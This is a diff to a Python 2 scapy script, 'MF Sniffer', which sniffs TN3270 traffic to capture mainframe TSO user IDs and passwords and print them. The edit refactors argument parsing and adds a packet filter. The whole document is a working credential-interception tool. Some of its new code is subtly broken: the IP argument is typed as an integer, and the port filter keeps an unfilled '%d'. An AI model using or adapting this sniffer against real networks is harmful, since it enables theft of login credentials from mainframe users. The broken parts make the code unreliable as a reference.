@@ -17,7 +17,8 @@ from scapy.all import * #needed for scapy
 import argparse #needed for argument parsing
 import re
 
-print '''
+def welcome():
+    print '''
           ____________________________
         /|............................|
        | |:         Mainframe        :|
@@ -33,25 +34,6 @@ print '''
             `--------------------'
        Stealing passwords like its 1985
 '''
-
-
-#start argument parser
-parser = argparse.ArgumentParser(description='MF Sniffer - A script to capture TSO user ID and password',epilog='PRESS PLAY ON TAPE')
-parser.add_argument('-a','--ip', help='Mainframe TN3270 server IP address',dest='ip')
-parser.add_argument('-p','--port', help='Mainframe TN3270 server listening port (e.g 23, 2323, 623, etc)',dest='port')
-parser.add_argument('-i','--interface', help='network interface to listen on',dest='interface')
-results = parser.parse_args() # put the arg results in the variable results
-
-
-#for now you need to set this manually
-interface = results.interface
-port = results.port
-ip_address = results.ip
-
-print "-{X}- Mainframe: ", ip_address,':', port
-print "-{X}- Sniffer started on interface:", interface
-
-
 
 #EBCDIC converter to ignore non-ascii chars
 # from http://www.pha.com.au/kb/index.php/Ebcdic.py
@@ -82,16 +64,14 @@ magic = re.compile('}(\xc1\xd7\x11@Z|\xc9.\x11\xc9\xc3)', re.DOTALL)
 
 def sniffTSO(pkt):
 	raw=pkt.sprintf("%r,Raw.load%")
-	dst=pkt.sprintf("%IP.dst%")
-	dport=pkt.sprintf("%IP.dport%")
-	if dst == ip_address and dport == port and raw.__len__() < 200:
+	if raw.__len__() < 200:
 		# If the destination and port match and the length of data is less than 200 chars
 		# convert the raw string to an ebcdic string so we can search, etc
 		sniffed = EbcdicToAscii(raw[1:-1])
 		#print "[+] Length is", raw.__len__()
 		#print sniffed
 		#print "[+] Ordinals: ",
-                m = magic.find(raw)
+                m = magic.search(raw)
                 if m is None:
                     return
                 if m.group()[1] == '\xc1':
@@ -101,6 +81,28 @@ def sniffTSO(pkt):
                 print "-{X}- Mainframe %s: %s" % (field, sniffed[m.end()-1:-1])
 	#print ""
 
-# Start scapy sniffer on interface and
-# pass all packets to the function sniffTSO
-sniff(iface=interface, prn=sniffTSO, store=False)
+if __name__ == '__main__':
+    welcome()
+    #start argument parser
+    parser = argparse.ArgumentParser(description='MF Sniffer - A script to capture TSO user ID and password',
+                                     epilog='PRESS PLAY ON TAPE')
+    parser.add_argument('-a', '--ip', help='Mainframe TN3270 server IP address', type=int)
+    parser.add_argument('-p', '--port', help='Mainframe TN3270 server listening port (e.g 23, 2323, 623, etc)')
+    parser.add_argument('-i', '--interface', help='network interface to listen on')
+    args = parser.parse_args()
+    
+    flt = 'tcp'
+    if args.ip is not None:
+        flt += ' and dst host %s' % args.ip
+    if args.port is not None:
+        flt += ' and dst port %d'
+
+    print "-{X}- Mainframe:", args.ip is not None and args.ip or '*', ':', args.port is not None and args.port or '*'
+    if args.interface is not None:
+        print "-{X}- Sniffer started on interface:", args.interface
+    
+    # Start scapy sniffer on interface and
+    # pass all packets to the function sniffTSO
+    sniff(iface=args.interface, prn=sniffTSO,
+          filter=flt,
+          store=False)
